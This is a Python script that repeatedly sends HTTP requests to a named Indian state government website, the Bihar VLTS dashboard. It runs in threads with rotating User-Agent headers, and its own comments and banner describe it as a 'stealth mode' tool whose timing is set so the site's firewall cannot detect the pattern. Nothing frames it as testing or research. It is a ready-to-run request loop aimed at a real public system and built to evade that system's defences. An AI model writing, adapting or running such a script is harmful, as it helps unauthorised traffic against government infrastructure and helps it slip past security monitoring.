import requests
import threading
import random
import time
import sys

# --- OPTIMIZED CONFIG ---
TARGET_URL = "https://vlts.bihar.gov.in" # Use Domain + HTTPS
THREADS = 2                             # Slow threads to avoid instant block
TIMEOUT = 15                            # High timeout for slow govt servers

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) Safari/604.1"
]

def packet_sender(thread_id):
    while True:
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            start = time.time()
            # Requesting the Domain instead of IP
            response = requests.get(TARGET_URL, headers=headers, timeout=TIMEOUT)
            latency = (time.time() - start) * 1000
            print(f"[Thread {thread_id}] SUCCESS | Status: {response.status_code} | {latency:.0f}ms")
        except Exception as e:
            print(f"[Thread {thread_id}] Firewall Drop: {type(e).__name__}")
        
        # 5 second ka gap taaki firewall pattern na pakad sake
        time.sleep(5)

if __name__ == "__main__":
    print("--- BIHAR VLTS DASHBOARD: STEALTH MODE ---")
    for i in range(THREADS):
        threading.Thread(target=packet_sender, args=(i,), daemon=True).start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        sys.exit()
